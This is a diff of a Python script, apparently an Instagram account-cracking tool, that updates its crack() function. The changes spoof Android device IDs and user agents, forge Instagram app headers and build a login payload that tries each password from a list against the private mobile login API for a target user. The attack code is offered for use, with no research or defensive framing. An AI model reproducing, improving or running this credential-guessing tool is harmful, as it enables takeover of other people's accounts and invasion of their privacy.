@@ -6,7 +6,15 @@ Fixed and optimized with cloning functionality
 Author: BITHIKA
 Version: 2.0
 """
-
+import hashlib
+import uuid
+import time
+import urllib.parse
+import random
+import requests
+import re
+import json
+import base64
 import random
 import sys
 import time
@@ -99,26 +107,41 @@ def crack(uid, password_list, total_count):
             
             # Create session and generate device hash
             session = requests.Session()
-            device_hash = generate_device_hash(uid, pw)
+            # Generate device ID and other required IDs
+            device_id = f"android-{uuid.uuid4().hex[:16]}"
+            family_device_id = str(uuid.uuid4())
+        
+            # First hash for username+password
+            first_hash = hashlib.md5()
+            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
+            first_hex = first_hash.hexdigest()
+        
+            # Second hash with salt for device ID
+            second_hash = hashlib.md5()
+            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
+            android_id_hash = second_hash.hexdigest()[:16]
+        
+            # Generate user agent
+            useragent = "Instagram 309.0.0.28.114 Android (29/10; 380dpi; 1080x2080; OnePlus; GM1903; OnePlus7; qcom; en_US; 439209455)"            
             headers = {
             'host': 'i.instagram.com',
             'x-ig-app-locale': 'in_ID',
             'x-ig-device-locale': 'in_ID',
             'x-ig-mapped-locale': 'id_ID',
             'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
-            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+            'x-pigeon-rawclienttime': f'{time.time():.3f}',
             'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
             'x-ig-www-claim': '0',
             'x-bloks-is-prism-enabled': 'false',
             'x-bloks-is-layout-rtl': 'false',
-            'x-ig-device-id': str(uuid.uuid4()),
-            'x-ig-family-device-id': str(uuid.uuid4()),
-            'x-ig-android-id': f'android-{device_hash[:16]}',
+            'x-ig-device-id': device_id,
+            'x-ig-family-device-id': family_device_id,
+            'x-ig-android-id': f'android-{android_id_hash}',
             'x-fb-connection-type': 'MOBILE.LTE',
             'x-ig-connection-type': 'MOBILE(LTE)',
             'x-ig-capabilities': '3brTv10=',
             'priority': 'u=3',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-S906U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.124 Mobile Safari/537.36 Instagram 408.0.0.0.45 Android (35/15; 450dpi; 1080x2340; samsung; SM-S906U1; g0q; qcom; es_LA; 827194262; IABMV/1)',
+            'user-agent': useragent,
             'accept-language': 'id-ID, en-US',
             'x-mid': '',
             'ig-intended-user-id': '0',
@@ -126,20 +149,62 @@ def crack(uid, password_list, total_count):
             'x-fb-http-engine': 'Liger',
             'x-fb-client-ip': 'True',
             'x-fb-server-cluster': 'True',
-            'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
-            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
-            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
+            'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
+            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
+            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
             'x-ig-app-id': '3419628305025917',
-            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
             'connection': 'keep-alive'
             }
-            payload = {'params': '{"client_input_params":{"device_id":"'+ str(headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(uid)+'","machine_id":"'+str(headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(uid)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(headers['x-ig-family-device-id'])+'","device_id":"'+str(headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}','bk_client_context': '{"bloks_version":"'+ str(headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(headers['x-bloks-version-id'])}
-            encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id']))
-            # Update headers with content length and cookies
-            headers.update({
-                'content-length': str(len(payload)),
-                'cookie': ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
-            })
+            # Generate timestamp for password
+            timestamp = int(time.time())
+        
+            # URL encode username and password
+            encoded_username = urllib.parse.quote(uid)
+            encoded_password = urllib.parse.quote(pw)
+        
+            # Generate encrypted password format
+            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
+            # Prepare the encoded data
+            params_dict = {
+            "client_input_params": {
+                "device_id": f"android-{android_id_hash}",
+                "login_attempt_count": 1,
+                "secure_family_device_id": "",
+                "machine_id": "",
+                "accounts_list": [],
+                "auth_secure_device_id": "",
+                "password": encrypted_password,
+                "family_device_id": family_device_id,
+                "fb_ig_device_id": [],
+                "device_emails": [],
+                "try_num": 3,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "client_known_key_hash": "",
+                "contact_point": encoded_username,
+                "encrypted_msisdn": ""
+            },
+            "server_params": {
+                "username_text_input_id": "p5hbnc:46",
+                "device_id": f"android-{android_id_hash}",
+                "should_trigger_override_login_success_action": 0,
+                "server_login_source": "login",
+                "waterfall_id": str(uuid.uuid4()),
+                "login_source": "Login",
+                "INTERNAL__latency_qpl_instance_id": 152086072800150,
+                "reg_flow_source": "login_home_native_integration_point",
+                "is_platform_login": 0,
+                "is_caa_perf_enabled": 0,
+                "credential_type": "password",
+                "family_device_id": family_device_id,
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
+                "INTERNAL_INFRA_THEME": "harm_f",
+                "password_text_input_id": "p5hbnc:47",
+                "ar_event_source": "login_home_page"
+            }
+        }
             
             # Make API request
             response = session.post(
